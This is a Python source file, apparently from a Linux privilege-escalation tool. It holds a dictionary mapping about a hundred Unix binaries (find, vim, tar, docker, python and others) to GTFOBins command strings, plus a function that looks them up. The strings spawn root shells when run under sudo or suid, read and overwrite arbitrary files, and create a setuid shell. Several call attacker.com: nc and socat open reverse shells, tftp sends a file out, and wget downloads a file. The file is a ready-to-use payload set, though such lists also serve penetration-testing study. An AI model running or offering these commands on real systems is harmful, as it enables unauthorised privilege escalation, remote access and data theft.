#!/usr/bin/env python
# -*- coding: utf-8 -*-


class Binaries:
    """
    Binaries that allow to execute commands from it.
    If run with higher privilege (suid / cron / ...) could be used to elevate our privilege
    http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html
    https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html#abusing-sudo-rights
    http://touhidshaikh.com/blog/?p=790
    """

    def __init__(self):
        """
        List taken from GTFOBins:
        https://gtfobins.github.io/#
        """

        self.binaries = {
            "apt": "apt-get changelog apt\n!/bin/sh\n",
            "apt-get": "apt-get changelog apt\n!/bin/sh\n",
            "aria2c": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n",
            "ash": "ash",
            "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
            "base64": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n",
            "bash": "bash",
            "busybox": "busybox sh",
            "cat": "LFILE=file_to_read\ncat \"$LFILE\"\n",
            "chmod": "LFILE=file_to_change\nsudo chmod 0777 $LFILE\n",
            "chown": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n",
            "cp": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
            "cpan": "cpan\n! exec '/bin/bash'\n",
            "cpulimit": "cpulimit -l 100 -f /bin/sh",
            "crontab": "crontab -e",
            "csh": "csh",
            "curl": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n",
            "cut": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n",
            "dash": "dash",
            "date": "LFILE=file_to_read\ndate -f $LFILE\n",
            "dd": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n",
            "diff": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n",
            "dmsetup": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n",
            "docker": "sudo docker run --rm -v /home/$USER:/h_docs ubuntu \\\n    sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh' && ~/sh -p\n",
            "easy_install": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n",
            "ed": "ed\n!/bin/sh\n",
            "emacs": "emacs -Q -nw --eval '(term \"/bin/sh\")'",
            "env": "env /bin/sh",
            "expand": "LFILE=file_to_read\nexpand \"$LFILE\"\n",
            "expect": "expect -c 'spawn /bin/sh;interact'",
            "facter": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n",
            "find": "find . -exec /bin/sh \\; -quit",
            "finger": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n",
            "flock": "flock -u / /bin/sh",
            "fmt": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n",
            "fold": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n",
            "ftp": "ftp\n!/bin/sh\n",
            "gdb": "gdb -nx -ex '!sh' -ex quit",
            "git": "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
            "grep": "LFILE=file_to_read\ngrep '' $LFILE\n",
            "head": "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n",
            "ionice": "ionice /bin/sh",
            "jjs": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs",
            "journalctl": "journalctl\n!/bin/sh\n",
            "jq": "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n",
            "jrunscript": "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"",
            "ksh": "ksh",
            "ld.so": "/lib/ld.so /bin/sh",
            "less": "less /etc/profile\n!/bin/sh\n",
            "ltrace": "ltrace -b -L /bin/sh",
            "lua": "lua -e 'os.execute(\"/bin/sh\")'",
            "mail": "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n",
            "make": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
            "man": "man man\n!/bin/sh\n",
            "more": "TERM= more /etc/profile\n!/bin/sh\n",
            "mount": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
            "mv": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n",
            "mysql": "mysql -e '\\! /bin/sh'",
            "nano": "TF=$(mktemp)\necho 'exec sh' > $TF\nchmod +x $TF\nnano -s $TF /etc/hosts\n^T\n",
            "nc": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
            "nice": "nice /bin/sh",
            "nl": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n",
            "nmap": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n",
            "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n",
            "od": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n",
            "perl": "perl -e 'exec \"/bin/sh\";'",
            "pg": "pg /etc/profile\n!/bin/sh\n",
            "php": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n",
            "pic": "pic -U\n.PS\nsh X sh X\n",
            "pico": "TF=$(mktemp)\necho 'exec sh' > $TF\nchmod +x $TF\npico -s $TF /etc/hosts\n^T\n",
            "pip": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n",
            "puppet": "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n",
            "python": "python -c 'import os; os.system(\"/bin/sh\")'",
            "red": "red file_to_write\na\nDATA\n.\nw\nq\n",
            "rlwrap": "rlwrap /bin/sh",
            "rpm": "rpm --eval '%{lua:posix.exec(\"/bin/sh\")}'",
            "rpmquery": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
            "rsync": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
            "ruby": "ruby -e 'exec \"/bin/sh\"'",
            "scp": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n",
            "sed": "sed -n '1e exec sh 1>&0' /etc/hosts",
            "setarch": "setarch $(arch) /bin/sh",
            "sftp": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n",
            "shuf": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n",
            "smbclient": "smbclient \\\\ip\\share\n!/bin/sh\n",
            "socat": "RHOST=attacker.com\nRPORT=12345\nsudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane\n",
            "sort": "LFILE=file_to_read\nsort -m \"$LFILE\"\n",
            "sqlite3": "sqlite3 /dev/null '.shell /bin/sh'",
            "ssh": "ssh localhost $SHELL --noprofile --norc",
            "start-stop-daemon": "start-stop-daemon -n $RANDOM -S -x /bin/sh",
            "stdbuf": "stdbuf -i0 /bin/sh",
            "strace": "strace -o /dev/null /bin/sh",
            "tail": "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n",
            "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "taskset": "taskset 1 /bin/sh",
            "tclsh": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
            "tcpdump": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n",
            "tee": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n",
            "telnet": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n",
            "tftp": "RHOST=attacker.com\nsudo -E tftp $RHOST\nput file_to_send\n",
            "time": "/usr/bin/time /bin/sh",
            "timeout": "timeout 7d /bin/sh",
            "ul": "LFILE=file_to_read\nul \"$LFILE\"\n",
            "unexpand": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n",
            "uniq": "LFILE=file_to_read\nuniq \"$LFILE\"\n",
            "unshare": "unshare /bin/sh",
            "vi": "vi -c ':!/bin/sh'",
            "vim": "vim -c ':!/bin/sh'",
            "watch": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
            "wget": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nsudo -E wget $URL -O $LFILE\n",
            "whois": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n",
            "wish": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
            "xargs": "xargs -a /dev/null sh",
            "xxd": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n",
            "zip": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n",
            "zsh": "zsh"
        }

    def find_binary(self, binary):
        """
        Found the associated command line to execute system code using the binary
        """
        for b in self.binaries:
            if b == binary.lower():
                return self.binaries[b]
        return False
